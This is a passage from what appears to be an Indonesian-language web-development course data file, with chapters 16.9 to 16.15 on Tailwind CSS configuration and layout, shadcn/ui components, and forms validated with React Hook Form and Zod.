    analogy: { diagram: "CSS Tradisional:\n  .card { padding: 1rem; border-radius: 0.5rem; box-shadow: ... }\n  → Tulis CSS, terapkan class di HTML\n\nTailwind:\n  <div class=\"p-4 rounded-lg shadow-md\">\n  → Class utility langsung di markup", caption: "Tailwind memindahkan styling dari file CSS ke class HTML — lebih cepat dan konsisten" },

    explanation: "Kalau kamu belajar CSS tradisional, pasti familiar dengan pola ini: tulis class CSS di file .css, lalu terapkan class tersebut di HTML. Misalnya:\\n```\\n/* style.css */\\n.btn-primary {\\n  background-color: blue;\\n  color: white;\\n  padding: 10px 20px;\\n  border-radius: 5px;\\n}\\n```\\n\\n```html\\n<button class=\\\"btn-primary\\\">Klik</button>\\n```\\n\\nIni bekerja, tapi ada masalah:\\n1. Harus bolak-balik antara file CSS dan HTML\\n2. Class names bisa bentrok (scope global)\\n3.\n\nSetiap komponen butuh CSS terpisah\\n4. Hard to maintain saat aplikasi besar\\n\\n**Utility-First: Paradigma Baru**\\nTailwind CSS mengambil pendekatan berbeda: alih-alih menulis class CSS custom, kamu menggunakan class utility yang sudah disediakan. Setiap class utility melakukan SATU hal saja.\\n\\n```html\\n<button class=\\\"bg-blue-600 text-white px-4 py-2 rounded\\\">\\n  Klik\\n</button>\\n```\\n\\nbg-blue-600 = background biru\\ntext-white = teks putih\\npx-4 = padding horizontal\\npy-2 = padding vertical\\nrounded = border radius\\n\\n**Kenapa Utility-First Lebih Baik?**\\n1. **Tidak perlu nama class**: Nggak perlu mikir nama class yang meaningful dan unik\\n2.\n\n**Tidak meninggalkan HTML**: Semua styling ada di markup, tidak perlu bolak-balik file\\n3. **Design system built-in**: Ukuran, warna, spacing sudah dikurasi — konsisten otomatis\\n4. **Responsive mudah**: Cukup tambah prefix (sm:, md:, lg:, xl:)\\n5. **Hover/focus/focus-visible**: Cukup tambah prefix (hover:bg-blue-700)\\n\\n**Setup Tailwind di React**\\n```\\nnpm install -D tailwindcss postcss autoprefixer\\nnpx tailwindcss init -p\\n```\\n\\nTailwind 4.0 bahkan lebih simpel lagi — tidak perlu init config.\n\nCukup import CSS dan mulai pakai class utility.\\n\\n**Analogi Tailwind**\\nBayangkan CSS tradisional seperti memasak dari bahan mentah. Kamu beli tepung, gula, telur, campur, oven — hasilnya enak tapi butuh waktu dan keahlian. Tailwind seperti meal kit: bahan sudah terukur dan disiapkan, tinggal ikuti instruksi. Hasilnya konsisten dan lebih cepat.",

    codeExample: { language: "html", code: "<!-- Tanpa Tailwind: bikin CSS sendiri -->\n<style>\n  .profile-card { padding: 1.5rem; border-radius: 0.75rem; }\n  .profile-avatar { width: 4rem; height: 4rem; border-radius: 50%; }\n  .profile-name { font-size: 1.25rem; font-weight: 600; color: #111; }\n</style>\n<div class=\"profile-card\">\n  <img class=\"profile-avatar\" src=\"avatar.jpg\" />\n  <h3 class=\"profile-name\">Budi</h3>\n</div>\n\n<!-- Dengan Tailwind: utility class langsung -->\n<div class=\"p-6 rounded-xl shadow-md bg-white\">\n  <img class=\"w-16 h-16 rounded-full\" src=\"avatar.jpg\" />\n  <h3 class=\"text-xl font-semibold text-gray-900\">Budi</h3>\n  <p class=\"text-gray-600\">Web Developer</p>\n  <button class=\"mt-4 px-4 py-2 bg-blue-600 text-white rounded-lg\n                 hover:bg-blue-700 transition-colors\">\n    Follow\n  </button>\n</div>" },

    explainAlong: "Kode atas perlu file CSS terpisah dengan custom classes. Kode bawah semua styling di markup dengan utility classes yang predictable.",

    aiPrompt: "Setup Tailwind di project Vite + React. Ubah satu komponen yang sebelumnya pakai CSS tradisional menjadi Tailwind utility classes.",

    reflection: "Coba buat komponen Card, Button, dan Badge hanya dengan Tailwind — tanpa menulis satu baris CSS custom.",

  },

  {

    id: "16.10",

    moduleId: 16,

    chapterNum: "16.10",

    title: "Kustomisasi Tailwind: Config, Theme, dan Plugin",

    subtitle: "Tailor design system sesuai kebutuhan brand dan proyek",

    level: "Menengah",

    objectives: [

      "Mengerti tailwind.config.js",

      "Bisa menambahkan custom colors, fonts, spacing",

      "Tahu cara membuat dan menggunakan plugin",

    ],

    analogy: { diagram: "tailwind.config.js:\n  theme: {\n    extend: {\n      colors: { brand: '#3b82f6' },\n      fontFamily: { sans: ['Inter', ...] }\n    }\n  }\n\nUsage:\n  <div class=\"text-brand font-sans\">", caption: "Tailwind config memungkinkan kustomisasi design system tanpa kehilangan utility-first approach" },

    explanation: "Tailwind datang dengan design system default yang bagus — tapi hampir pasti kamu perlu menyesuaikannya dengan kebutuhan brand atau proyekmu.\n\nMisalnya: warna brand khusus, font custom, breakpoint berbeda, atau spacing yang tidak ada di default.\\n\\n**File Konfigurasi: tailwind.config.js**\\nFile ini adalah pusat kustomisasi Tailwind.\n\nSemua pengaturan design system ada di sini.\n\nStrukturnya:\\n\\n```js\\nmodule.exports = {\\n  content: ['./src/**/*.{js,jsx,ts,tsx}'], // Scan file mana saja\\n  theme: { // Override/extend design system\\n    extend: { // Tambah tanpa menghapus default },\\n  },\\n  plugins: [],\n\n// Plugin tambahan\\n};\\n```\\n\\n**Extend vs Override**\\n- extend: Menambah properti BARU atau mengganti yang sudah ada, tanpa menghapus default\\n- Tanpa extend (langsung di theme): MENGGANTI seluruh default — hati-hati!\\n\\n**Custom Colors**\\nWarna adalah yang paling sering dikustomisasi.\n\nAda beberapa cara:\\n\\n1. **Tambah warna baru**: 'brand': '#3b82f6' → pakai sebagai text-brand, bg-brand, border-brand\\n2. **Override palette**: 'blue': { 500: 'new-hex' } → ubah blue-500 secara global\\n3. **CSS Variables**: Gunakan var() untuk dark mode support\\n\\n**Custom Font Family**\\nFont default Tailwind adalah system font stack (font yang ada di OS user).\n\nUntuk custom font seperti Inter atau Poppins:\\n\\n1.\n\nImport font (Google Fonts atau self-host)\\n2.\n\nDaftarkan di tailwind.config.js\\n3.\n\nGunakan class font-sans, font-serif, atau font-mono\\n\\n**Plugin Tailwind**\\nTailwind punya ekosistem plugin yang kaya:\\n- **@tailwindcss/typography**: Style konten prose/Markdown (artikel, blog)\\n- **@tailwindcss/forms**: Normalisasi styling form elements\\n- **@tailwindcss/aspect-ratio**: Utility untuk aspect ratio\\n- **@tailwindcss/line-clamp**: Memotong teks setelah N baris\\n\\n**Dark Mode**\\nTailwind punya built-in dark mode support:\\n\\n```js\\n// tailwind.config.js\\nmodule.exports = {\\n  darkMode: 'class',\n\n// atau 'media'\\n};\\n```\\n\\n```html\\n<!-- Pakai prefix dark: -->\\n<div class=\\\"bg-white dark:bg-gray-900 text-black dark:text-white\\\">\\n  Konten yang adaptif\\n</div>\\n```\\n\\nTambahkan class 'dark' di parent element (biasanya html tag) untuk mengaktifkan dark mode.",

    codeExample: { language: "javascript", code: "// tailwind.config.js\nmodule.exports = {\n  content: ['./index.html', './src/**/*.{js,ts,jsx,tsx}'],\n  darkMode: 'class',\n  theme: {\n    extend: {\n      colors: {\n        brand: {\n          50: '#eff6ff',\n          100: '#dbeafe',\n          500: '#3b82f6',\n          600: '#2563eb',\n          900: '#1e3a5f',\n        },\n        dark: {\n          bg: '#0f172a',\n          card: '#1e293b',\n          border: '#334155',\n        },\n      },\n      fontFamily: {\n        sans: ['Inter', 'system-ui', 'sans-serif'],\n        mono: ['Fira Code', 'monospace'],\n      },\n      spacing: {\n        '18': '4.5rem',\n        '88': '22rem',\n      },\n      borderRadius: {\n        '4xl': '2rem',\n      },\n    },\n  },\n  plugins: [\n    require('@tailwindcss/typography'),\n    require('@tailwindcss/forms'),\n  ],\n};" },

    explainAlong: "Baris 4: Aktifkan dark mode dengan class strategy. Baris 7-18: Custom color palette brand dan dark. Baris 19-22: Custom fonts. Baris 23-26: Spacing tambahan.",

    aiPrompt: "Buat design system di tailwind.config.js: tambahkan warna brand, font Inter, dan spacing custom. Buat komponen yang menggunakan semua kustomisasi tersebut.",

    reflection: "Analisis brand atau proyek yang sedang kamu kerjakan. Apa warna primary-nya? Font-nya? Spacing yang sering dipakai? Sesuaikan Tailwind config-mu.",

  },

  {

    id: "16.11",

    moduleId: 16,

    chapterNum: "16.11",

    title: "Layout dan Responsif dengan Tailwind",

    subtitle: "Sistem grid, flexbox, dan breakpoint untuk layout modern",

    level: "Menengah",

    objectives: [

      "Menguasai Flexbox dan Grid dengan Tailwind",

      "Bisa membuat layout responsif dengan breakpoint",

      "Mengerti container dan spacing system",

    ],

    analogy: { diagram: "Breakpoints:\n  sm: 640px, md: 768px, lg: 1024px, xl: 1280px\n\nLayout:\n  flex, grid, grid-cols-3, gap-4\n  md:flex-row, lg:grid-cols-4\n\nContainer:\n  container mx-auto px-4", caption: "Tailwind membuat layout responsif dengan prefix breakpoint yang intuitif" },

    explanation: "Salah satu kekuatan Tailwind adalah membuat layout responsif menjadi sangat mudah.\n\nTidak perlu media query manual — cukup tambahkan prefix breakpoint pada utility class.\\n\\n**Breakpoint System**\\nTailwind menggunakan mobile-first approach.\n\nArtinya: utility tanpa prefix berlaku untuk SEMUA ukuran layar, dan kamu tambahkan prefix untuk layar yang lebih besar.\\n\\n```\\nsm: 640px  → Small devices (landscape phones)\\nmd: 768px  → Medium (tablets)\\nlg: 1024px → Large (desktops)\\nxl: 1280px → Extra large\\n2xl: 1536px → Ultra wide\\n```\\n\\nContoh: class=\\\"text-sm md:text-base lg:text-lg\\\"\\n- Mobile: text-sm\\n- Tablet+: text-base\\n- Desktop+: text-lg\\n\\n**Flexbox dengan Tailwind**\\nTailwind memiliki utility class untuk SEMUA properti flexbox:\\n\\n- display: flex → flex\\n- direction: flex-row, flex-col, flex-row-reverse\\n- justify: justify-start, center, between, around, evenly\\n- align: items-start, center, end, stretch\\n- wrap: flex-wrap, flex-nowrap, flex-wrap-reverse\\n- grow/shrink: flex-1, flex-auto,\n\nFlex-none\\n\\n**Grid dengan Tailwind**\\nGrid system Tailwind sangat powerful:\\n\\n- display: grid → grid\\n- columns: grid-cols-1, grid-cols-2, grid-cols-3, ..., grid-cols-12\\n- rows: grid-rows-2, grid-rows-3\\n- gap: gap-2, gap-4, gap-x-4, gap-y-2\\n- column/row span: col-span-2, row-span-3, col-span-full\\n\\n**Container**\\nClass container adalah cara cepat untuk membatasi lebar konten dan center-kan:\\n```html\\n<div class=\\\"container mx-auto px-4\\\">\\n  <!-- Konten di sini, max-width otomatis -->\\n</div>\\n```\\n\\nContainer punya max-width yang berbeda tiap breakpoint: 640px (sm), 768px (md), 1024px (lg), dst.\\n\\n**Spacing Scale**\\nTailwind menggunakan spacing scale berbasis 0.25rem (4px):\\n- p-1 = 0.25rem (4px)\\n- p-2 = 0.5rem (8px)\\n- p-4 = 1rem (16px)\\n- p-8 = 2rem (32px)\\n\\nScale ini konsisten di semua utility: padding (p-, px-, py-, pt-), margin (m-, mx-, my-), gap, dan spacing.",

    codeExample: { language: "html", code: "<!-- Layout responsif: Card Grid -->\n<div class=\"container mx-auto px-4 py-8\">\n  <div class=\"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 md:gap-6\">\n    <!-- Card 1 -->\n    <div class=\"bg-white rounded-xl shadow-sm border p-4 md:p-6\">\n      <div class=\"flex items-center gap-3\">\n        <div class=\"w-12 h-12 rounded-full bg-blue-100 flex items-center justify-center\">\n          <span class=\"text-blue-600 text-xl\">📱</span>\n        </div>\n        <div>\n          <h3 class=\"font-semibold text-gray-900\">Mobile App</h3>\n          <p class=\"text-sm text-gray-500\">iOS & Android</p>\n        </div>\n      </div>\n    </div>\n    <!-- Card 2 -->\n    <div class=\"bg-white rounded-xl shadow-sm border p-4 md:p-6\">\n      <div class=\"flex items-center gap-3\">\n        <div class=\"w-12 h-12 rounded-full bg-green-100 flex items-center justify-center\">\n          <span class=\"text-green-600 text-xl\">🌐</span>\n        </div>\n        <div>\n          <h3 class=\"font-semibold text-gray-900\">Website</h3>\n          <p class=\"text-sm text-gray-500\">Responsive</p>\n        </div>\n      </div>\n    </div>\n    <!-- Lebih banyak card... -->\n  </div>\n</div>\n\n<!-- Layout sidebar: flex -->\n<div class=\"flex flex-col md:flex-row min-h-screen\">\n  <aside class=\"w-full md:w-64 bg-gray-800 text-white p-4\">Sidebar</aside>\n  <main class=\"flex-1 p-6 bg-gray-50\">Main Content</main>\n</div>" },

    explainAlong: "Baris 2: Grid 1 kolom di mobile, 2 di tablet, 3 di desktop, 4 di wide. Baris 23: Sidebar di atas di mobile, di samping di tablet+.",

    aiPrompt: "Buat layout dashboard responsif: sidebar + main content. Sidebar collapsable di mobile. Gunakan grid untuk widget cards.",

    reflection: "Buka website populer di DevTools responsive mode. Coba replika layoutnya dengan Tailwind utility classes.",

  },

  {

    id: "16.12",

    moduleId: 16,

    chapterNum: "16.12",

    title: "Tailwind Lanjutan: Animasi, Arbitrary Values, dan @apply",

    subtitle: "Teknik advanced untuk kasus khusus dan reusable components",

    level: "Menengah–Lanjut",

    objectives: [

      "Bisa menggunakan arbitrary values",

      "Mengerti @apply untuk extract component classes",

      "Menguasai animasi dan transition dengan Tailwind",

    ],

    analogy: { diagram: "Arbitrary: w-[123px], bg-[#1da1f2], top-[100vh]\n@apply: \n  .btn-primary { @apply px-4 py-2 bg-blue-600 text-white rounded; }\nAnimasi: animate-ping, animate-pulse, animate-bounce", caption: "Arbitrary values untuk kasus spesial, @apply untuk komponen reusable" },

    explanation: "Setelah menguasai dasar Tailwind, ada beberapa teknik advanced yang akan sering kamu butuhkan saat bekerja pada proyek nyata.\\n\\n**Arbitrary Values**\\nKadang kamu butuh nilai yang tidak ada di scale default Tailwind.\n\nDaripada menambah ke config, gunakan arbitrary values dengan syntax [nilai]:\\n\\n```html\\n<!-- Warna arbitrary -->\\n<div class=\\\"bg-[#1da1f2]\\\">Twitter Blue</div>\\n\\n<!-- Ukuran arbitrary -->\\n<div class=\\\"w-[123px] h-[45px]\\\">Custom size</div>\\n\\n<!-- Properti CSS arbitrary -->\\n<div class=\\\"top-[100vh] left-[50%]\\\">Positioned</div>\\n\\n<!-- Arbitrary dengan modifier -->\\n<div class=\\\"md:bg-[#ff0000] hover:text-[18px]\\\">Responsive arbitrary</div>\\n```\\n\\nArbitrary values menggunakan bracket notation [].\n\nDi dalam bracket kamu bisa tulis nilai CSS apa pun.\n\nIni sangat berguna untuk:\\n- Warna dari API/design token\\n- Ukuran yang sangat spesifik\\n- Properti CSS yang tidak ada utility-nya\\n\\n**@apply Directive**\\nMeskipun Tailwind menganjurkan utility-first,\n\nKadang kamu perlu extract serangkaian class menjadi class tunggal — terutama untuk komponen yang sering di-duplicate.\\n\\nGunakan @apply di file CSS:\\n```css\\n.btn-primary {\\n  @apply px-4 py-2 bg-blue-600 text-white font-medium rounded-lg\\n         hover:bg-blue-700 focus:ring-2 focus:ring-blue-500\\n         disabled:opacity-50 disabled:cursor-not-allowed\\n         transition-colors duration-200;\\n}\\n```\\n\\nTapi hati-hati! @apply sebaiknya digunakan sparingly.\n\nUtility-first approach lebih disarankan karena:\\n1.\n\nLebih mudah lihat styling langsung di markup\\n2.\n\nTidak perlu bolak-balik file\\n3.\n\nLebih mudah override per-instance\\n\\n**Animasi dan Transisi**\\nTailwind punya utility untuk transisi dan animasi:\\n\\nTransisi:\\n- transition-all, transition-colors, transition-transform\\n- duration-100, duration-200, duration-300, duration-500, duration-1000\\n- ease-linear, ease-in, ease-out,\n\nEase-in-out\\n\\nAnimasi built-in:\\n- animate-spin: Rotasi 360 derajat (loading spinner)\\n- animate-ping: Scale dan fade out (notification badge)\\n- animate-pulse: Opacity fade in-out (skeleton loading)\\n- animate-bounce: Gerakan bounce (arrow indicator)\\n\\n**Group and Peer Modifiers**\\nKadang kamu perlu style elemen berdasarkan state elemen lain:\\n\\n```html\\n<!-- Group hover: style child saat parent di-hover -->\\n<div class=\\\"group hover:bg-gray-100\\\">\\n  <span class=\\\"group-hover:text-blue-600\\\">Berubah saat parent di-hover</span>\\n</div>\\n\\n<!-- Peer: style elemen berdasarkan state sibling -->\\n<input type=\\\"checkbox\\\" class=\\\"peer\\\" />\\n<span class=\\\"peer-checked:bg-blue-600\\\">Berubah saat checkbox dicheck</span>\\n```",

    codeExample: { language: "html", code: "<!-- Button dengan @apply (file CSS) -->\n<style>\n  .btn {\n    @apply px-5 py-2.5 rounded-lg font-medium transition-all duration-200\n           focus:outline-none focus:ring-2 focus:ring-offset-2;\n  }\n  .btn-primary {\n    @apply btn bg-blue-600 text-white hover:bg-blue-700\n           focus:ring-blue-500 active:scale-95;\n  }\n  .btn-ghost {\n    @apply btn text-gray-700 hover:bg-gray-100\n           focus:ring-gray-400;\n  }\n</style>\n\n<!-- Penggunaan -->\n<button class=\"btn-primary\">Simpan</button>\n<button class=\"btn-ghost\">Batal</button>\n\n<!-- Animasi dan arbitrary values -->\n<div class=\"animate-pulse bg-gray-200 rounded-lg w-[280px] h-[160px]\"></div>\n\n<!-- Group hover untuk card interaktif -->\n<div class=\"group relative overflow-hidden rounded-xl\">\n  <img src=\"photo.jpg\" class=\"transition-transform duration-500 group-hover:scale-110\" />\n  <div class=\"absolute inset-0 bg-black/0 group-hover:bg-black/40 transition-colors\">\n    <p class=\"opacity-0 group-hover:opacity-100 text-white text-center pt-16 transition-opacity\">\n      Lihat Detail\n    </p>\n  </div>\n</div>" },

    explainAlong: "@apply memungkinkan extract class utility ke CSS class reusable. Group hover memungkinkan interaksi antar elemen parent-child.",

    aiPrompt: "Buat komponen Button, Input, dan Card dengan @apply. Tambahkan berbagai variant (primary, secondary, danger, ghost).",

    reflection: "Cari inspirasi di Tailwind UI (tailwindui.com) atau daisyUI. Lihat bagaimana mereka membangun komponen dengan utility classes.",

  },

  {

    id: "16.13",

    moduleId: 16,

    chapterNum: "16.13",

    title: "shadcn/ui: Komponen UI yang Bisa Diedit",

    subtitle: "Paradigma copy-paste: kuasai komponen, bukan cuma pakai",

    level: "Menengah",

    objectives: [

      "Memahami filosofi shadcn/ui",

      "Bisa install dan setup shadcn/ui",

      "Mengerti bedanya shadcn vs library UI lain",

    ],

    analogy: { diagram: "Library UI tradisional (Material-UI, Chakra):\n  npm install @mui/material → import { Button } → pakai\n  (Komponen black box, sulit dikustomisasi)\n\nshadcn/ui:\n  npx shadcn add button → kode masuk ke project → edit sesuka hati\n  (Komponen transparan, full control)", caption: "shadcn/ui menyalin kode komponen ke project — kamu punya kontrol penuh" },

    explanation: "Kalau kamu pernah pakai library UI seperti Material-UI atau Chakra UI, mungkin kamu familiar dengan flow ini: install package → import komponen → pakai. Mudah dan cepat. Tapi ada masalah: ketika butuh kustomisasi yang tidak didukung props, kamu stuck. Harus pakai styling workaround, !important, atau bahkan fork library.\\n\\n**shadcn/ui: Paradigma Baru**\\nshadcn/ui mengambil pendekatan RADIKAL berbeda: alih-alih install package, kamu MENYALIN kode komponen langsung ke project.\n\nYa, benar — kode komponennya jadi milikmu, bisa diedit sesuka hati.\\n\\nAnaloginya seperti membeli rumah:\\n- Library UI tradisional = Apartemen. Dibangun developer, kamu pakai apa adanya. Mau ubah struktur? Susah, harus izin pengembang.\\n- shadcn/ui = Rumah prefabrikasi.\n\nKomponen sudah jadi, tapi kamu punya blueprint-nya. Mau ubah layout? Ganti material? Boleh, rumahnya kan milikmu.\\n\\n**Cara Kerja shadcn/ui**\\n1.\n\nInisialisasi shadcn/ui di project (setup Tailwind, CSS variables, path alias)\\n2. Install komponen yang dibutuhkan dengan CLI\\n3. Kode komponen muncul di folder components/ui/\\n4. Import dan gunakan seperti komponen sendiri\\n5.\n\nButuh kustomisasi? Edit langsung file-nya!\\n\\n**Keuntungan Approach Ini**\\n1. **Full ownership**: Kode di projectmu, tidak ada dependency tambahan\\n2. **Kustomisasi tanpa batas**: Edit kode, styling, behavior sesuai kebutuhan\\n3.\n\n**Tidak terjebak versi**: Tidak perlu nunggu library update untuk fitur baru\\n4. **Konsisten**: Semua komponen pakai Tailwind + CSS variables yang sama\\n5. **Accessible**: Dibangun di atas Radix UI primitives (accessibility built-in)\\n\\n**Setup shadcn/ui**\\n```bash\\n# 1. Inisialisasi\\nnpx shadcn@latest init\\n\\n# 2.\n\nInstall komponen yang dibutuhkan\\nnpx shadcn@latest add button card dialog form\\n\\n# 3. Import dan pakai\\nimport { Button } from '@/components/ui/button';\\n```\\n\\n**Struktur Komponen**\\nSetiap komponen shadcn/ui adalah file tunggal yang berisi:\\n- React component menggunakan Tailwind classes\\n- Variant dengan cva (class-variance-authority)\\n- Forward ref untuk ref forwarding\\n- TypeScript types\\n\\nIni berarti kamu tidak hanya mendapat komponen yang works — kamu mendapat PATTERN terbaik untuk membangun komponen.",

    codeExample: { language: "tsx", code: "// Install: npx shadcn@latest add button\n// Hasil: components/ui/button.tsx\n\nimport * as React from 'react';\nimport { cva, type VariantProps } from 'class-variance-authority';\nimport { cn } from '@/lib/utils';\n\nconst buttonVariants = cva(\n  'inline-flex items-center justify-center rounded-md text-sm font-medium transition-colors',\n  {\n    variants: {\n      variant: {\n        default: 'bg-primary text-primary-foreground hover:bg-primary/90',\n        destructive: 'bg-destructive text-destructive-foreground hover:bg-destructive/90',\n        outline: 'border border-input bg-background hover:bg-accent',\n        ghost: 'hover:bg-accent hover:text-accent-foreground',\n        link: 'text-primary underline-offset-4 hover:underline',\n      },\n      size: {\n        default: 'h-10 px-4 py-2',\n        sm: 'h-9 px-3',\n        lg: 'h-11 px-8',\n        icon: 'h-10 w-10',\n      },\n    },\n    defaultVariants: {\n      variant: 'default',\n      size: 'default',\n    },\n  }\n);\n\nexport interface ButtonProps\n  extends React.ButtonHTMLAttributes<HTMLButtonElement>,\n    VariantProps<typeof buttonVariants> {}\n\nconst Button = React.forwardRef<HTMLButtonElement, ButtonProps>(\n  ({ className, variant, size, ...props }, ref) => {\n    return (\n      <button\n        className={cn(buttonVariants({ variant, size, className }))}\n        ref={ref}\n        {...props}\n      />\n    );\n  }\n);\nButton.displayName = 'Button';\nexport { Button, buttonVariants };" },

    explainAlong: "cva (class-variance-authority) mengelola variant komponen. cn() utility menggabungkan className dengan merge yang benar. Forward ref memungkinkan ref dilewatkan ke elemen button.",

    aiPrompt: "Inisialisasi shadcn/ui di project-mu. Install komponen Button, Card, dan Input. Coba edit styling default Button sesuai preferensimu.",

    reflection: "Lihat folder components/ui/ setelah install shadcn. Pelajari strukturnya — ini akan menjadi blueprint untuk komponen custom-mu.",

  },

  {

    id: "16.14",

    moduleId: 16,

    chapterNum: "16.14",

    title: "Form dengan shadcn/ui: Input, Select, dan Validation",

    subtitle: "Bangun form yang accessible dan validasi dengan React Hook Form + Zod",

    level: "Menengah",

    objectives: [

      "Bisa membuat form dengan shadcn/ui components",

      "Mengintegrasikan React Hook Form dan Zod",

      "Mengerti form validation schema",

    ],

    analogy: { diagram: "Form Flow:\nUser Input → React Hook Form (state) → Zod (validasi) → Submit\n\nKomponen:\n├── Form (context provider)\n├── FormField (register field)\n├── FormItem (wrapper + styling)\n├── FormLabel, FormControl, FormMessage", caption: "shadcn/ui form = shadcn components + React Hook Form + Zod validation" },

    explanation: "Form adalah salah satu bagian paling kompleks dalam UI development.\n\nAda state management, validasi, error handling, accessibility, dan styling — semuanya harus bekerja sama. shadcn/ui menyediakan solusi form yang terintegrasi dengan React Hook Form dan Zod.\\n\\n**React Hook Form: State Management Form**\\nReact Hook Form (RHF) adalah library untuk mengelola form state di React.\n\nKeunggulannya:\\n- **Performa**: Minimal re-render (menggunakan uncontrolled components + ref)\\n- **Validasi**: Integrasi mudah dengan schema validation\\n- **Developer experience**: API yang simple dan intuitive\\n\\n**Zod: Schema Validation**\\nZod adalah TypeScript-first schema validation.\n\nKamu definisikan schema untuk data, dan Zod akan validasi secara runtime.\\n\\n```typescript\\nconst userSchema = z.object({\\n  nama: z.string().min(2,\n\n'Nama minimal 2 karakter'),\\n  email: z.string().email('Email tidak valid'),\\n  umur: z.number().min(18, 'Minimal 18 tahun'),\\n});\\n```\\n\\n**Integrasi shadcn/ui + RHF + Zod**\\nshadcn/ui menyediakan komponen Form yang menangani semua integrasi.\n\nPattern-nya:\\n\\n1. Definisikan schema Zod\\n2. Buat form dengan useForm() dan zodResolver\\n3. Gunakan Form, FormField, FormItem, FormControl, FormLabel, FormMessage\\n4.\n\nRegister field dengan RHF\\n5. Handle submit dengan validasi otomatis\\n\\n**Komponen Form shadcn/ui**\\n- **Form**: Context provider (FormProvider dari RHF)\\n- **FormField**: Register satu field ke RHF\\n- **FormItem**: Wrapper dengan styling dan accessibility\\n- **FormLabel**: Label yang terhubung dengan input\\n- **FormControl**: Wrapper input yang forward props\\n- **FormDescription**: Text deskriptif di bawah input\\n- **FormMessage**: Pesan error (otomatis dari Zod)\\n\\n**Mengapa Kombinasi Ini Powerful?**\\n1. Type safety: Zod schema memberikan type inference otomatis\\n2. Accessibility: Label terhubung dengan input, error diumumkan screen reader\\n3.\n\nConsistent styling: Semua form element konsisten dengan design system\\n4. Minimal boilerplate: shadcn/ui menangani wiring antara RHF dan UI",

    codeExample: { language: "tsx", code: "import { zodResolver } from '@hookform/resolvers/zod';\nimport { useForm } from 'react-hook-form';\nimport * as z from 'zod';\nimport { Button } from '@/components/ui/button';\nimport {\n  Form, FormControl, FormDescription,\n  FormField, FormItem, FormLabel, FormMessage,\n} from '@/components/ui/form';\nimport { Input } from '@/components/ui/input';\n\nconst formSchema = z.object({\n  username: z.string().min(2, 'Username minimal 2 karakter').max(50),\n  email: z.string().email('Format email tidak valid'),\n  password: z.string().min(8, 'Password minimal 8 karakter'),\n});\n\nfunction ProfileForm() {\n  const form = useForm<z.infer<typeof formSchema>>({\n    resolver: zodResolver(formSchema),\n    defaultValues: { username: '', email: '', password: '' },\n  });\n\n  function onSubmit(values: z.infer<typeof formSchema>) {\n    console.log(values);\n  }\n\n  return (\n    <Form {...form}>\n      <form onSubmit={form.handleSubmit(onSubmit)} className=\"space-y-6\">\n        <FormField\n          control={form.control}\n          name=\"username\"\n          render={({ field }) => (\n            <FormItem>\n              <FormLabel>Username</FormLabel>\n              <FormControl>\n                <Input placeholder=\"budisetiawan\" {...field} />\n              </FormControl>\n              <FormDescription>Nama pengguna publik.</FormDescription>\n              <FormMessage />\n            </FormItem>\n          )}\n        />\n        {/* Field lainnya... */}\n        <Button type=\"submit\">Simpan</Button>\n      </form>\n    </Form>\n  );\n}" },

    explainAlong: "zodResolver menghubungkan Zod schema ke RHF. FormField mendaftarkan field ke form context. FormMessage otomatis menampilkan error dari Zod.",

    aiPrompt: "Buat form registrasi lengkap dengan field nama, email, password, konfirmasi password, dan tanggal lahir. Semua field divalidasi dengan Zod.",

    reflection: "Coba submit form tanpa mengisi field. Perhatikan bagaimana error message muncul otomatis dari Zod schema.",

  },

  {

    id: "16.15",

    moduleId: 16,

    chapterNum: "16.15",

    title: "shadcn/ui Lanjutan: Dialog, Table, dan Complex Components",

    subtitle: "Komponen interaktif: modal, data table, dropdown, dan toast notification",

    level: "Menengah–Lanjut",

    objectives: [

      "Bisa menggunakan Dialog dan Sheet",

      "Mengerti Data Table pattern",

      "Menguasai Toast/Sonner untuk notifikasi",

    ],

    analogy: { diagram: "Complex Components:\n├── Dialog (modal dengan overlay)\n├── Sheet (sidebar slide-in)\n├── DataTable (sort, filter, pagination)\n├── DropdownMenu\n└── Sonner/Toaster (notifikasi)\n\nSemua dibangun dari Radix UI primitives + Tailwind", caption: "shadcn/ui complex components = Radix primitives + Tailwind + logic komponen" },

    explanation: "Setelah menguasai komponen dasar seperti Button dan Input, saatnya beralih ke komponen interaktif yang lebih kompleks.\n\nKomponen-komponen ini adalah building blocks untuk aplikasi modern.\\n\\n**Dialog (Modal)**\\nDialog adalah jendela popup yang muncul di atas konten. shadcn/ui Dialog dibangun di atas Radix Dialog primitive — sudah include focus trapping, scroll locking,\n\nDan keyboard navigation (Escape untuk tutup).\\n\\nKomponen Dialog terdiri dari: DialogTrigger (pemicu), DialogContent (konten modal), DialogHeader, DialogTitle, DialogDescription, dan DialogFooter.\\n\\n**Sheet (Slide-in Panel)**\\nSheet adalah panel yang meluncur dari sisi layar — biasa digunakan untuk detail view, form, atau navigation di mobile.\n\nMirip Dialog tapi animasi dan posisi berbeda.\\n\\n**Data Table**\\nData Table adalah komponen paling kompleks di shadcn/ui.\n\nBukan satu komponen, melainkan kumpulan komponen yang bekerja sama:\\n\\n- **Table**: Wrapper HTML table dengan styling\\n- **TanStack Table**: Library untuk logic sorting, filtering,\n\nPagination\\n- **Column definitions**: Definisi kolom dengan accessor dan cell renderer\\n\\nPattern ini memisahkan presentation (shadcn/ui Table) dari logic (TanStack Table) — sangat powerful dan fleksibel.\\n\\n**Toast / Sonner Notifikasi**\\nUntuk notifikasi non-blocking (success, error, info), gunakan Sonner (atau Toast).\n\nKomponen ini menampilkan pesan singkat yang otomatis hilang setelah beberapa detik.\\n\\nCara pakai:\\n1. Letakkan Toaster di root layout\\n2. Panggil toast() atau sonner() dari mana saja\\n3. Notifikasi muncul otomatis dengan posisi dan durasi yang bisa dikustomisasi\\n\\n**Pattern Penggunaan**\\nKombinasi komponen-komponen ini mencakup 90% kebutuhan UI aplikasi modern:\\n- Form input → Dialog → Submit → Toast success\\n- DataTable → Row action (DropdownMenu) → Dialog konfirmasi → Mutasi data → Toast\\n- Sidebar navigation → Sheet (mobile)\\n\\nSemua komponen ini sudah accessible by default karena dibangun di atas Radix UI primitives.",

